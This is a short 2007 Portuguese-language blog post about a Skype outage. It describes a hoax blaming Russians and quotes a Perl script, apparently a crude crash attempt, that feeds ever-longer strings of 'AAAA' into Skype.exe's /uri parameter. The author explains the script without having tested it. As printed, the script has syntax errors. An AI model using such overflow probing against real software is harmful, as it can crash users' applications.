Skype offline

  • Aug 20, 2007
  • #infra , #old , #dicas.txt , #2007
  • One minute read

O Skype ficou offline semana passada, o pessoal da empresa disse que era problemas na infra deles. Hoje vi no Meiobit que tinha um hoax dizendo que foram os Russos, sempre eles “Na Rússia soviética você não vai até o skype, ele vem até você”, e até apareceu um script Perl por lá, a possível causa de toda a bagunça:

#!/usr/bin/perl
# Simle Code by Maranax Porex ;D
# Ya Skaypeg!!

for ($i=256; $i>xCCCCC; $i=$i+256)
{
$eot=’AAAA’ x $i;
call_sp();
}
exit;

sub call_sp()
{
$str=”\”C:\\Program Files\\Skype\\Phone\\Skype.exe\” \”/uri:$eot\”";
system(”$str”);
}

O que o script faz é ficar passando AAAA ( inicialmente 256 vezes, e depois multíplos disso ) para o parâmetro uri do aplicativo Skype.exe aparentemente só funciona no Windows, fiz o teste no MacOSX e não tem como passar esse parâmetro para o binário, infelizmente ( ou felizmente? ) eu não tenho um Windows aqui para testar. Se esse foi o motivo para o Skype ficar fora do ar só tenho uma coisa a dizer, Eskabuska!
